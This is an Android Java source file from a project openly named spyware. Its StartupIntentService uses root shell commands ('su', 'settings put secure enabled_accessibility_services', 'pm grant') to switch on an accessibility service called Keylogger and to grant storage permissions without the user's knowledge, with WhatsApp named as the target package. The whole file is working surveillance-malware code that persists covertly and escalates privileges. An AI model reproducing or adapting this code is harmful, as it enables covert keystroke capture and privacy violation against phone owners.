package com.example.cristianturetta.spyware;

import android.app.IntentService;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.AsyncTask;
import android.support.annotation.Nullable;
import android.util.Log;

import java.io.DataOutputStream;

public class StartupIntentService extends IntentService {

    final private String packageName = "com.whatsapp";
    final private String accessibilityPackage = "com.example.cristianturetta.spyware";

    public StartupIntentService() {
        super("StartupIntentService");
    }

    /**
     * This method is invoked on the worker thread with a request to process.
     * Only one Intent is processed at a time, but the processing happens on a
     * worker thread that runs independently from other application logic.
     * So, if this code takes a long time, it will hold up other requests to
     * the same IntentService, but it will not hold up anything else.
     * When all requests have been handled, the IntentService stops itself,
     * so you should not call {@link #stopSelf}.
     *
     * @param intent The value passed to {@link
     *               Context#startService(Intent)}.
     *               This may be null if the service is being restarted after
     *               its process has gone away; see
     *               {@link Service#onStartCommand}
     *               for details.
     */
    @Override
    protected void onHandleIntent(@Nullable Intent intent) {
        enableAccessibility();
        enableStoragePermissions();
    }

    private void enableStoragePermissions(){
        Log.d("StartupIntentService", "Enabling Storage permissions...");
        try {
            Process process = Runtime.getRuntime().exec("su");
            DataOutputStream os = new DataOutputStream(process.getOutputStream());
            os.writeBytes("pm grant " + packageName + " android.permission.WRITE_EXTERNAL_STORAGE\n");
            os.flush();
            os.writeBytes("exit\n");
            os.flush();

            process.waitFor();
            if (process.exitValue() == 0){
                Log.d("StartupIntentService", "Storage permissions enabled");
            } else {
                Log.d("StartupIntentService", "Storage permissions not enabled, exit code:" + process.exitValue());
            }
        } catch (Exception e) {
            e.printStackTrace();
        }

    }

    private void enableAccessibility(){
        Log.d("StartupIntentService", "Enabling Accessibility Service...");
        try {
            Process process = Runtime.getRuntime().exec("su");
            DataOutputStream os = new DataOutputStream(process.getOutputStream());
            os.writeBytes("settings put secure enabled_accessibility_services " + packageName +"/"+ accessibilityPackage + ".Keylogger\n");
            os.flush();
            os.writeBytes("settings put secure accessibility_enabled 1\n");
            os.flush();
            os.writeBytes("exit\n");
            os.flush();

            process.waitFor();
            if (process.exitValue() == 0){
                Log.d("StartupIntentService", "Accessibility Service enabled");
            } else {
                Log.d("StartupIntentService", "Accessibility Service not enabled, exit code:" + process.exitValue());
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

}